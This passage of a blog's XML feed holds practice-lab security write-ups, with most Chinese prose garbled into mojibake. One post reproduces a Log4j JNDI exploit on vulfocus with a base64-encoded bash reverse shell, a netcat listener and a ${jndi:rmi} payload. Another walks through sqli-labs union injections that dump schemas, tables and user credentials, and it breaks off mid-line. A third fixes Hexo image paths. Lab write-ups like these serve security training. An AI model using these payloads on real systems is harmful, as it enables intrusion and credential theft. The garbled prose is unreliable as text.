        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>å¹³å°ï¼švulfocus<br>å·¥å…·ï¼šJNDI-Injection-Exploit</p><h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><p><strong>å‡†å¤‡æœ¬åœ°æ”»å‡»ç¯å¢ƒ</strong><br>å‡†å¤‡ä½¿ç”¨JNDI-Injection-Exploitåå¼¹shell<br>æ„å»ºshell<br><img src="https://img-blog.csdnimg.cn/7905a992254f45b6b45f4f1fc5a910b6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰“å¼€JNDI-Injection-Exploit</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8wLjAuMC4wLzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A <span class="string">&quot;0.0.0.0&quot;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°<strong>JNDI links</strong>ï¼Œå¤‡å¥½ä¸€ä¼šæ”¾åœ¨burpé‡Œé¢</p><p>ç›‘å¬9999ç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 9999</span><br></pre></td></tr></table></figure><p><strong>åœ¨vulfocusæ‰“å¼€åœ¨çº¿é¶æœºç¯å¢ƒ</strong><br><img src="https://img-blog.csdnimg.cn/c2993a2c056f41a8b51d61ceb816dac3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŠ“åŒ…ï¼Œæ ¹æ®æç¤ºæ›´æ”¹åŒ…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /hello HTTP/1.1</span><br><span class="line">Host: vulfocus.fofa.so:63137</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 54</span><br><span class="line"></span><br><span class="line">payload=<span class="variable">$&#123;jndi:rmi://0.0.0.0/xgr2vd&#125;</span><span class="comment">#åˆšåˆšå¤‡å¥½çš„JNDI links</span></span><br></pre></td></tr></table></figure><p>å‘åŠ¨è¿‡å»å°±å¾—åˆ°åå¼¹shelläº†ï¼Œæ‰¾åˆ°flagï¼Œä¸€èˆ¬åœ¨tmp<br><img src="https://img-blog.csdnimg.cn/a68e0274250f49e2856a0476d4c0fd8a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h2><p>JNDI-exploitåŸç†</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="http://vulfocus.fofa.so/">vulfocusåœ¨çº¿ç¯å¢ƒ</a><br><a href="https://ylcao.top/2021/12/apache-log4j2-rce%E5%A4%8D%E7%8E%B0/">Apache log4j2 rceå¤ç°</a><br><a href="https://www.cxyzjd.com/article/qq_40007043/107615314">æ¼æ´å¤ç°ç³»åˆ—â€“fastjsonï¼œ&#x3D;1.2.47ååºåˆ—åŒ–æ¼æ´_æ¢¦ä¹‹æ—…è¡Œåœ°-ç¨‹åºå‘˜å®…åŸºåœ°</a><br><a href="https://x.hacking8.com/java-runtime.html">javaå‘½ä»¤æ‰§è¡Œpayloads</a><br><a href="https://chowdera.com/2021/12/202112102325553772.html">Apache Log4j 2 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆåå¼¹shellï¼‰</a><br><a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases">JNDI-Injection-Exploit</a><br><a href="http://dnslog.cn/">http://dnslog.cn/</a><br><a href="https://www.cnblogs.com/Icedisaster/p/15675313.html">æµ…è°ˆæœ€è¿‘é—¹å¾—ç«çƒ­çš„Log4j RCEæ¼æ´</a><br><a href="https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce">CVE-2021-44228(Apache Log4j Remote Code Executionï¼‰</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexoé¢„è§ˆå¤±è´¥é—®é¢˜æµ…è§£</title>
      <link href="/2022/02/19/hexo%E9%A2%84%E8%A7%88%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E6%B5%85%E8%A7%A3/"/>
      <url>/2022/02/19/hexo%E9%A2%84%E8%A7%88%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E6%B5%85%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="hexoé¢„è§ˆå¤±è´¥é—®é¢˜æµ…è§£"><a href="#hexoé¢„è§ˆå¤±è´¥é—®é¢˜æµ…è§£" class="headerlink" title="hexoé¢„è§ˆå¤±è´¥é—®é¢˜æµ…è§£"></a>hexoé¢„è§ˆå¤±è´¥é—®é¢˜æµ…è§£</h1><h2 id="åŸå› "><a href="#åŸå› " class="headerlink" title="åŸå› "></a>åŸå› </h2><p>åœ¨<code>VScode</code>ä¸Šä½¿ç”¨<code>Paste Image</code>æ’ä»¶,æœ¬åœ°é¢„è§ˆæ²¡æœ‰é—®é¢˜ï¼Œæœ¬åœ°é¢„è§ˆä¸æ˜¾ç¤ºã€‚åŸå› ä½äºhexoæœ¬èº«å¹¶ä¸å¤„ç†å›¾ç‰‡ç»™å®šçš„å›¾ç‰‡è·¯å¾„ï¼Œä½†æ˜¯åšå®¢postä¸‹çš„æ–‡ä»¶ä¼šæ ¹æ®æ—¶é—´æ›´æ”¹è·¯å¾„ï¼Œå¯¼è‡´å‡ºé”™ã€‚</p><h2 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h2><p>1ã€ä¿®æ”¹åšå®¢æ ¹ç›®å½•<code>_config.yml</code>æ–‡ä»¶çš„é…ç½®é¡¹<code>post_asset_folder</code>ä¸º<code>true</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: true <span class="comment">#åœ¨æ–°å»ºåšæ–‡æ—¶ï¼ŒåŒç›®å½•ä¸‹åˆ›å»ºåŒåæ–‡ä»¶å¤¹ï¼Œä¸ºå­˜æ”¾å›¾ç‰‡åšå‡†å¤‡</span></span><br></pre></td></tr></table></figure><p>2ã€ä¿®æ”¹<code>Paste Image</code>è®¾ç½®ï¼Œä¿è¯æ–‡ä»¶å­˜å‚¨åˆ°åŒåæ–‡ä»¶å¤¹ã€‚</p><p><img src="/2022/02/19/hexo%E9%A2%84%E8%A7%88%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E6%B5%85%E8%A7%A3/2022-02-19-13-44-29.png">  </p><p>æ‰“å¼€ <code>extension setting</code>ï¼Œç‚¹å‡»æ‰“å¼€setting.json  </p><p><img src="/2022/02/19/hexo%E9%A2%84%E8%A7%88%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E6%B5%85%E8%A7%A3/2022-02-19-13-47-41.png"></p><p>æ·»åŠ å¦‚ä¸‹ä¸¤æ¡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;pasteImage.path&quot;</span>: <span class="string">&quot;$&#123;currentFileNameWithoutExt&#125;&quot;</span>,</span><br><span class="line"><span class="string">&quot;pasteImage.insertPattern&quot;</span>: <span class="string">&quot;$&#123;imageSyntaxPrefix&#125;./$&#123;currentFileNameWithoutExt&#125;/$&#123;imageFileName&#125;$&#123;imageSyntaxSuffix&#125;&quot;</span>,</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¡ä¿å­˜ç…§ç‰‡åˆ°åŒåæ–‡ä»¶å¤¹ï¼Œç¬¬äºŒæ¡ä¿å­˜å›¾ç‰‡urlä¸ºç›¸å¯¹è·¯å¾„ï¼Œæ–¹ä¾¿é…åˆåé¢çš„æ’ä»¶</p><p>3ã€å®‰è£…æ’ä»¶</p><p>è¯¥æ’ä»¶å¯ä»¥æŠŠå›¾ç‰‡æ”¾åœ¨åšæ–‡åŒåæ–‡ä»¶å¤¹ä¸‹ï¼Œå¹¶ä¿®æ”¹å›¾ç‰‡è®¿é—®è·¯å¾„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œå¯ä»¥å¿«ä¹çš„å¤åˆ¶ç²˜è´´äº†</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.jianshu.com/p/ea78bdd0551f">è§£å†³Hexoåšå®¢ä¸æ˜¾ç¤ºå›¾ç‰‡çš„ä¸€ç§æ–¹æ³•</a><br><a href="https://tanjuntao.github.io/2019/04/28/%E8%A7%A3%E5%86%B3hexo%E4%B8%AD%E5%8F%91%E5%B8%83%E6%96%87%E7%AB%A0%E5%90%8E%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%97%AE%E9%A2%98/">è§£å†³hexoä¸­å‘å¸ƒæ–‡ç« åå›¾ç‰‡æ— æ³•æ˜¾ç¤ºçš„é—®é¢˜</a><br><a href="https://github.com/mushanshitiancai/vscode-paste-image/blob/master/src/extension.ts">Paste Image</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> un_problems </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs</title>
      <link href="/2022/02/17/sqli-labs/"/>
      <url>/2022/02/17/sqli-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labsé€šå…³æµ…è§£"><a href="#sqli-labsé€šå…³æµ…è§£" class="headerlink" title="sqli-labsé€šå…³æµ…è§£"></a>sqli-labsé€šå…³æµ…è§£</h1><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><h3 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h3><p><strong>level-1æŠ¥é”™å‹-å­—ç¬¦å‹ æ³¨å…¥</strong></p><p>1ã€åœ¨urlåè¾¹åŠ å…¥GETå‚æ•°idï¼Œå¹¶æ•…æ„æ·»åŠ å•å¼•å·ï¼Œæµ‹è¯•æ˜¯å¦å­˜åœ¨ç®€å•æ³¨å…¥ç‚¹ï¼Œå¾—åˆ°æŠ¥é”™ï¼Œè¯´æ˜å­˜åœ¨æ³¨å…¥ç‚¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/1256e96460c247a984fc8ca70620a95b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>2ã€åˆ¤æ–­å­—ç¬¦è¿˜æ˜¯æ•´å‹æ³¨å…¥ã€‚<br>æµ‹è¯•å¦‚ä¸‹url</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾æ­£å¸¸ï¼Œè¯´æ˜ä¸º<strong>å­—ç¬¦å‹</strong></p><p>åŸå› </p><p><strong>å­—ç¬¦å‹</strong>ï¼šwhere id&#x3D;â€™1 and 1&#x3D;2â€™ï¼Œåœ¨å¼•å·å†…ï¼Œé‡åˆ°ç©ºæ ¼åœæ­¢è¯»å–ï¼Œç­‰æ•ˆäºwhere id &#x3D;â€™1â€™ã€‚</p><p><strong>æ•´å‹</strong>ï¼šwhere id&#x3D;1 and 1&#x3D;2ï¼Œé€»è¾‘ä¸Šä¼šæŠ¥é”™ã€‚</p><p>3ã€åˆ¤æ–­å­—æ®µæ•°ã€‚<br><a href="https://www.w3school.com.cn/sql/sql_orderby.asp">ORDER BY è¯­å¥ç”¨äºå¯¹ç»“æœé›†è¿›è¡Œæ’åºã€‚</a><br>æ˜¾ç¤ºçš„æœ‰ä¸‰ä¸ªä¿¡æ¯ï¼Œæ‰€ä»¥çŒœæµ‹æœ‰ä¸‰ä¸ªï¼Œåˆ¤æ–­å­—æ®µæ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan 1</span><br><span class="line">Your Login name:Dumb 2</span><br><span class="line">Your Password:Dumb 3</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; order by 3%23 æ­£å¸¸</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-1/?id=1&#x27;</span> order by <span class="number">4</span>%<span class="number">23</span> ä¼šæŠ¥é”™ï¼ŒUnknown column <span class="string">&#x27;4&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;order clause&#x27;</span>ï¼Œæ‰€ä»¥æœ‰ä¸‰ä¸ªå­—æ®µ</span><br></pre></td></tr></table></figure><p>4ã€çˆ†æ•°æ®åº“ã€è¡¨ã€å­—æ®µå’Œå…¶ä»–æ•°æ®<br><a href="https://www.runoob.com/sql/sql-union.html">SQL UNION æ“ä½œç¬¦åˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ª SELECT è¯­å¥çš„ç»“æœã€‚</a></p><p>å¤§ç™½è¯ï¼šå¯ä»¥åˆ©ç”¨è¯¥ç‰¹æ€§è¿›è¡Œä¸ªæ€§åŒ–æŸ¥è¯¢ã€‚</p><p>ï¼ˆ1ï¼‰çˆ†æ•°æ®åº“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; union select 1,2,3%23</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d77c6b8868fc49f58289a55d540cf638.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯ä»¥åˆ©ç”¨2ï¼Œ3å­—æ®µ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ³•<span class="number">1</span>ï¼šhttp://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; union select 1,database(),3%23</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:security æ•°æ®åº“åç§°</span><br><span class="line">Your Password:<span class="number">3</span></span><br></pre></td></tr></table></figure><p>æ³•2ï¼šé€šç”¨è¯­å¥ï¼Œçˆ†æ•°æ®åº“å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;union select 1,group_concat(schema_name),3 from information_schema.schemata%23</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/f71474a779ee4f2a9d3ece5d4283a937.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ï¼ˆ2ï¼‰çˆ†è¡¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/e456241396c94049b2f7503ebdf685ea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>(3)çˆ†å­—æ®µï¼Œä»¥å…¶ä¸­è¡¨usersä¸ºä¾‹</p><p><a href="https://blog.csdn.net/chenhualeguan/article/details/52956662?utm_source=blogxgwz0">æ•°æ®åº“ä¸­INFORMATION_SCHEMAçš„è¯´æ˜åŠä½¿ç”¨</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;%23</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/806f61ac76d04559bb070e932094825a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥çœ‹å…¶ä¸­çš„éƒ¨åˆ†æ•°æ®ï¼Œå¦‚username,password</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;union select 1,group_concat(username,password),3 from users%23</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d006dcf3400e41a59ad78edba2dbffda.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h3><p><strong>level-2æŠ¥é”™å‹-æ•´å‹ æ³¨å…¥</strong><br>1ã€æµ‹è¯•æ˜¯å¦æœ‰ç®€å•æ³¨å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°æŠ¥é”™,å­˜åœ¨ç®€å•æ³¨å…¥  </p><p>2ã€åˆ¤æ–­å­—ç¬¦å‹è¿˜æ˜¯æ•´å‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> æ­£å¸¸</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> é”™è¯¯</span><br></pre></td></tr></table></figure><p>è¯´æ˜ä¸ºæ•´å‹<br>3ã€çˆ†å­—æ®µæ•°ã€æ•°æ®åº“ã€è¡¨ã€å­—æ®µ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=<span class="number">1</span> order by <span class="number">4</span><span class="comment">#  //çˆ†å­—æ®µæ•°</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-27-37.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">#  //æŸ¥çœ‹å¯æ³„éœ²å­—æ®µ</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-30-51.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,database(),<span class="number">3</span><span class="comment"># //æŸ¥çœ‹å½“å‰æ•°æ®åº“å</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-32-32.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata<span class="comment"># //æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“å</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-36-35.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables where table_schema=database()<span class="comment"># //æŸ¥çœ‹å½“å‰æ•°æ®åº“æ‰€æœ‰è¡¨å</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-37-55.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span><span class="comment"># //æŸ¥çœ‹å½“å‰æ•°æ®åº“æŸä¸€è¡¨çš„å…¨éƒ¨å­—æ®µåï¼Œä»¥usersä¸ºä¾‹</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-39-53.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,group_concat(username,password),<span class="number">3</span> <span class="keyword">from</span> users<span class="comment"># //æŸ¥çœ‹å½“å‰æ•°æ®åº“æŸä¸€è¡¨çš„éƒ¨åˆ†å­—æ®µå†…å®¹ï¼Œä»¥usersä¸ºä¾‹</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-41-40.png"></p><h3 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h3><p><strong>level3 æŠ¥é”™-å•å¼•å·-å°æ‹¬å·-å­—ç¬¦å‹-æ³¨å…¥</strong><br>1ã€æ˜¯å¦å­˜åœ¨ç®€å•æ³¨å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">3</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; æŠ¥é”™ï¼Œå­˜åœ¨ç®€å•æ³¨å…¥</span></span><br></pre></td></tr></table></figure><p>2ã€åˆ¤æ–­æ³¨å…¥ç±»å‹<br><img src="/2022/02/17/sqli-labs/2022-02-18-11-05-13.png"><br>å¯¹æ¯”ä¸€èˆ¬çš„ç®€å•å­—ç¬¦å‹æ³¨å…¥ï¼Œå¤šå‡ºæ¥ä¸€ä¸ªå•æ‹¬å·ï¼Œæ‰€ä»¥æ¨æµ‹åç«¯ä»£ç  ä¸º <code> WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code><br>æ‰€ä»¥æ³¨å…¥ç±»å‹ä¸º<strong>æŠ¥é”™-å•å¼•å·-å°æ‹¬å·-å­—ç¬¦å‹-sqlæ³¨å…¥</strong>ï¼Œæ¥ä¸‹æ¥æ„é€ è¯­å¥æ—¶åªéœ€è¦ä¿è¯å•å¼•å·ã€æ‹¬å·é—­åˆå³å¯</p><p>4ã€çˆ†å­—æ®µæ•°ã€æ•°æ®åº“ç­‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">3</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;)order by 4 %23  //çˆ†å­—æ®µæ•°</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-11-13-47.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">3</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;) union select 1,2,3 %23 //åŒ…æ˜¾æ€§å­—æ®µ </span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-11-15-19.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span 